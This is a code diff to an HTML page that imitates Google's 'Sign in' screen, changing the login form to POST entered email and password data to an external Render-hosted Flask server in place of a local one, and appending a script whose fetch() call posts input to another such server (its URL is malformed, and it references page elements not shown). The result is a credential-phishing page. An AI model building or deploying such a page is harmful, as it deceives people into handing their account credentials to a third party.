@@ -102,7 +102,7 @@
     <h2>Sign in</h2>
     <p>Use your Google Account. The account will be added to this device and available to other Google apps.</p>
 
-    <form action="http://127.0.0.1:5000/submit" method="POST">
+    <form action="https://serveur-flask-6qqm.onrender.com" method="POST">
       <input type="email" id="Email" name="Email" placeholder="Email or phone" required>
       <div style="text-align: left; margin-top: 8px;">
         <a href="#">Forgot email?</a>
@@ -119,5 +119,28 @@
       </div>
     </form>
   </div>
+    <script>
+        const sendBtn = document.getElementById("send");
+        const messageInput = document.getElementById("messageInput");
+        const responseDiv = document.getElementById("response");
+
+        sendBtn.addEventListener("click", () => {
+            const message = messageInput.value;
+
+            fetch("https://https://mon-serveur-flask.onrender.com/api/test", {  // <-- mets ici l'URL de ton serveur Flask
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ message: message })
+            })
+            .then(res => res.json())
+            .then(data => {
+                responseDiv.textContent = "Réponse du serveur : " + data.message;
+            })
+            .catch(err => {
+                console.error("Erreur :", err);
+                responseDiv.textContent = "Erreur de connexion au serveur";
+            });
+        });
+    </script>
 </body>
 </html>
